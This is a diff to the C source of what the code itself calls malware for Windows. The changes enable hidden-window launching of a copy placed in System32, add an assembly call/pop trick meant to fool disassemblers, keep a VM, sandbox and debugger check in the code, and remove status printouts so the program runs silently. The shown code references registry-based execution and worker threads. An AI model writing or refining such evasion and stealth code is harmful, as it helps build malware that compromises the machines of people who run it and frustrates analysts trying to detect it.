@@ -40,15 +40,25 @@ int main(int argc, char** argv) {
 #endif
 
 #if 0
-    // detect vms, sandboxes, and debuggers!
-    RET_CODE ret = detectAnalysisTools();
-    if (ret != R_SAFE_RET) {
-        printRetCode(ret);
-        return 1;
-    }
+    char *__foolPtr__;
+    __asm__ volatile (
+        "call label\n\t"            // push address of data onto stack
+        ".ascii \"__TMP__STR!\\0\"\n\t"  // push randon string as well
+        "label:\n\t"                // real code flow returns here
+        "pop %0\n\t"                // pop address into secret
+        : "=r"(__foolPtr__)
+        :
+        :
+    );
 #endif
 
-#if 0  // if we want to only test the malware execution
+#if 0
+    // detect vms, sandboxes, and debuggers!
+    RET_CODE ret = detectAnalysisTools();
+    if (ret != R_SAFE_RET) { return 1; }
+#endif
+
+#if 0    // if we want to only test the malware execution
     exec();
 #else
     // returns true on if our 32-bit process is running in a 64-bit machine
@@ -98,7 +108,6 @@ static void copyToSys32AndLaunch(char* path) {
     }
     CloseHandle(hSource);
     CloseHandle(hSys32Dest);
-    printf("Created SYS32 Executable..\n");
 
     STARTUPINFO si;
     PROCESS_INFORMATION pi;
@@ -108,8 +117,8 @@ static void copyToSys32AndLaunch(char* path) {
     
     DWORD dwCreationFlags = 0;
 
-#if 0
-    si.dwFlags |= STARTF_USESHOWWINDOW; // hide the window!
+#if 1  // hide the window!
+    si.dwFlags |= STARTF_USESHOWWINDOW;
     si.wShowWindow = SW_HIDE;
     dwCreationFlags = CREATE_NO_WINDOW;
 #endif
@@ -181,13 +190,10 @@ static void runFromRegistry(char** argv) {
 static void exec() {
     RET_CODE ret = setup();
     if (ret != R_SUCCESS) {
-        printRetCode(ret);
         programCleanup();
         return;
     }
 
     ret = startThreads();
-    printf("Cleaning up.\nProgram exited with msg:\n  - ");
-    printRetCode(ret);
     programCleanup();
 }
